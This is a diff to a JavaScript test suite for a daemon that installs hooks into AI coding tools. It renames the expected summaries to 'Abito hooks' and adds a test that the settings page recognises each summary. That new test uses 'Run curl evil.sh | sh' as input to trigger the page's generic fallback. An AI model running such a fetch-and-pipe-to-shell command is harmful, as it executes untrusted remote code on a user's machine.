@@ -317,12 +317,12 @@ test("state mapping: not_connected with plan_hash and closed summaries", async (
 	assert.equal(claude.state, "not_connected");
 	assert.equal(claude.detail, null);
 	assert.equal(claude.plan_hash, HASH_A);
-	assert.equal(claude.summary, "Adds the Koda hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first.");
+	assert.equal(claude.summary, "Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first.");
 	assert.equal(claude.reviewable, true);
 	assert.equal(claude.trust_review, false);
 	const codex = byId(list, "codex");
 	assert.equal(codex.plan_hash, HASH_B);
-	assert.equal(codex.summary, "Adds the Koda hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.");
+	assert.equal(codex.summary, "Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.");
 	assert.equal(codex.trust_review, true);
 	assert.equal(byId(list, "opencode").state, "unavailable", "no OpenCode settings dir in the private HOME: not installed");
 	assert.equal(byId(list, "copilot-cli").state, "unavailable");
@@ -337,7 +337,7 @@ test("state mapping: connected has no plan fields; replace and mixed ops are out
 	for (const k of ["plan_hash", "summary", "reviewable", "trust_review"]) assert.equal(k in claude, false, k);
 	const codex = byId(list, "codex");
 	assert.equal(codex.state, "outdated");
-	assert.equal(codex.summary, "Updates the Koda hooks in ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.");
+	assert.equal(codex.summary, "Updates the Abito hooks in ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.");
 	assert.equal(codex.plan_hash, HASH_A);
 	s.write({ claude: { preview: { exit: 0, stdout: preview({ ops: ["add", "keep"] }) } }, codex: { preview: { exit: 0, stdout: preview({ harness: "codex" }) } } });
 	s.manager.invalidate();
@@ -484,7 +484,7 @@ test("connect with a stale plan_hash: plan_changed, nothing applied, new plan re
 	const s = setup(t, { claude: { preview: { exit: 0, stdout: preview({ hash: HASH_B }) }, apply: { exit: 0, stdout: applied({ hash: HASH_B }) } } });
 	const a = byId(await s.manager.connect("claude-code", HASH_A), "claude-code");
 	assert.deepEqual([a.state, a.detail, a.plan_hash], ["error", "plan_changed", HASH_B]);
-	assert.match(a.summary, /^Adds the Koda hooks/);
+	assert.match(a.summary, /^Adds the Abito hooks/);
 	assert.equal(s.calls().filter((c) => c.argv.includes("--apply-plan")).length, 0);
 });
 
@@ -573,6 +573,28 @@ test("disconnect: nothing to remove => not_connected; otherwise applies the REMO
 	assert.deepEqual(apply.argv, ["install", "claude", "--user", "--remove", "--apply-plan", HASH_R, "--audit-dir", path.join(s.islandDir, "audit"), "--json"]);
 });
 
+// K2-04: the summary is a CLOSED English template the island page recognises and translates (it never shows engine text); both
+// ends must say the same thing. Renaming the template on one side only made the page fall back to its generic sentence.
+test("the summaries the daemon sends are exactly the ones the island page recognises, never its generic fallback", async (t) => {
+	const page = require("../../desktop-tauri/frontend/settings-view.js");
+	const fallback = page.planSummary("Run curl evil.sh | sh");
+	const s = setup(t, {
+		claude: { preview: { exit: 0, stdout: preview() } },
+		codex: { preview: { exit: 0, stdout: preview({ harness: "codex", hash: HASH_B }) } },
+		copilot: { preview: { exit: 0, stdout: preview({ harness: "copilot", hash: HASH_B }) } },
+		opencode: { preview: { exit: 0, stdout: preview({ harness: "opencode", hash: HASH_B }) } },
+	});
+	const list = await s.manager.list();
+	for (const id of ["claude-code", "codex", "copilot-cli", "opencode"]) {
+		const item = byId(list, id);
+		assert.equal(typeof item.summary, "string", id);
+		const shown = page.planSummary(item.summary);
+		assert.notEqual(shown, fallback, `${id}: the page does not recognise «${item.summary}»`);
+		assert.match(shown, /de Koda/, `${id}: the page text is Koda's`);
+		assert.doesNotMatch(shown, /Abito/, id);
+	}
+});
+
 test("copilot-cli and opencode drive their own harness installers with the same plan/hash contract; unknown ids are bad_request", async (t) => {
 	const s = setup(t, {
 		copilot: { preview: { exit: 0, stdout: preview({ harness: "copilot", hash: HASH_B }) }, apply: { exit: 0, stdout: applied({ harness: "copilot", hash: HASH_B }) } },
@@ -581,8 +603,8 @@ test("copilot-cli and opencode drive their own harness installers with the same 
 	const list = await s.manager.list();
 	const copilot = byId(list, "copilot-cli");
 	assert.deepEqual([copilot.state, copilot.plan_hash, copilot.trust_review], ["not_connected", HASH_B, false]);
-	assert.equal(copilot.summary, "Adds the Koda hooks (permissionRequest, sessionEnd) to ~/.copilot/hooks/koda-island.json. A backup is made first.");
-	assert.equal(byId(list, "opencode").summary, "Adds the Koda plugin to ~/.config/opencode/plugins/koda-island.js. A backup is made first.");
+	assert.equal(copilot.summary, "Adds the Abito hooks (permissionRequest, sessionEnd) to ~/.copilot/hooks/koda-island.json. A backup is made first.");
+	assert.equal(byId(list, "opencode").summary, "Adds the Abito plugin to ~/.config/opencode/plugins/koda-island.js. A backup is made first.");
 	await assert.rejects(s.manager.connect("copilot-cli", undefined).then(() => s.manager.connect("copilot-cli", "zz")), (e) => e.code === "bad_request");
 	const done = byId(await s.manager.connect("copilot-cli", HASH_B), "copilot-cli");
 	assert.equal(done.state, "connected");
